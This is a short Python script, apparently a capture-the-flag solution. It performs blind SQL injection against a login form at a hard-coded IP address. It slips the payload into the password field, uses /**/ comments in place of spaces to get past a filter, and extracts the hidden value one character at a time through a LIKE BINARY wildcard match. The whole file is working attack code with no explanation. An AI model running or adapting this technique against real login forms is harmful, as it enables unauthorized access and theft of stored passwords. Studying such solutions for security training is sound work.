import requests as rq

url = 'http://122.248.246.76/F7OYO88E/'

s = rq.Session()

flag = 'CDDC21{'
while flag[-1] != '}':
    for c in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}': 
        print(f'[*]: {c}')
        r = s.post(url, data={"username": "admin", 'password':f"'/**/or/**/password/**/like/**/binary/**/'{flag+c}%", 'sub':'', 'remember': 'on'}).text.split('\n')
        if 'No rows' in r[-1]:
            continue
        elif 'ILLEGAL' in r[-1]:
            print(f'[-] {c}, Illegal')
            continue
        flag = flag + c
        print(f'[+] Flag: {flag}   ({r[-1]})')

